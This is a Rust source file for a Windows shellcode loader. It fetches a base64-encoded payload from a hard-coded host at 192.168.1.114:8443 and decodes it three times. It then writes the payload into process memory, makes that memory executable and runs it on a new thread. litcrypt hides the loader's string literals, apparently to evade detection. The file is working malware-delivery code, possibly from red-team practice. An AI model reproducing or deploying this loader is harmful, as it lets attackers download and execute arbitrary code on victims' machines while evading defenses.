extern crate reqwest;
extern crate base64;
extern crate tokio;
extern crate windows;
extern crate litcrypt;
extern crate bytes;

use std::{ptr};
use bytes::Bytes;
use std::ffi::c_void;
use reqwest::Client;
use base64::{Engine as _, engine::general_purpose};
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            GetLastError,
            HANDLE,
            WIN32_ERROR
        },
        System::{
            Memory::{
                VirtualAllocEx, 
                VirtualProtectEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_PROTECTION_FLAGS,
                PAGE_READWRITE,
                PAGE_EXECUTE_READ,
            },
            WindowsProgramming::INFINITE,
            Threading::{
                // OpenProcess,
                CreateRemoteThread,
                // GetCurrentProcessId,
                GetCurrentProcess,
                // PROCESS_ALL_ACCESS,
                WaitForSingleObject
            }
        },
    },
    Win32::System::Diagnostics::Debug::WriteProcessMemory,
};


use litcrypt::{lc, use_litcrypt};

use_litcrypt!();


/// The URL where shellcode will be downloaded from
const URL: &str = "http://192.168.1.114:8443/note.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 3;

fn decode_shellcode(sc: Bytes, b64_iterations: usize) -> Result<Vec<u8>, String> {
    let mut shellcode_vec: Vec<u8> = sc.to_vec();
    for _i in 0..b64_iterations {
        match general_purpose::STANDARD.decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d;
            },
            Err(e) => { 
                let err_msg = e.to_string();
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}

async fn get_shellcode(url: String, b64_iterations: usize) -> Result<Vec<u8>, String> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            // Get the shellcode. Now we have to decode it
            let sc = r.bytes().await.unwrap();
            match decode_shellcode(sc, b64_iterations) {
                Ok(scd) => Ok(scd),
                Err(e)  => Err(e)
            }            

        } else {
            return Err(r.text().await.unwrap());
        }   

    } else {
        return Err(lc!("Could not download shellcode"));
    }
} 

#[tokio::main]
async fn main() {

    // Grab b64-encoded data from the provided url
    // Decode n_iters times
    // CreateThread with the shellcode
    match get_shellcode(URL.to_string(), B64_ITERATIONS).await {

        Ok(sc) => unsafe {

            // let pid: u32 = GetCurrentProcessId();
            // println!("Current PID: {pid}");
            let h: HANDLE = GetCurrentProcess();
            let sc_len = sc.len();
            
            println!("Handle: {:?}", h);
            println!("Allocating {sc_len} bytes of memory...");
            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
            println!("Writing memory...");
            let mut n = 0;
            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
            println!("Wrote {n} bytes");

            println!("Changing mem permissions to RX");
            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
            VirtualProtectEx(
                h,
                addr,
                sc_len,
                PAGE_EXECUTE_READ,
                &mut old_protect
            );

            
            println!("Creating Thread");
            let h_thread = CreateRemoteThread(
                h, 
                None, 
                0, 
                Some(std::mem::transmute(addr)), 
                None,
                0, 
                None
            )
            .unwrap();
            
            println!("Handle: {:?}", h_thread);
            
            CloseHandle(h);

            
            if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
               println!("{}", lc!("Good!"));
               println!("{}", lc!("Injection completed!"));
            } else {
               let error = GetLastError();
               println!("{:?}", error);
            }
        },
        Err(e) => {
            println!("{e}")
        }
    }
    
}
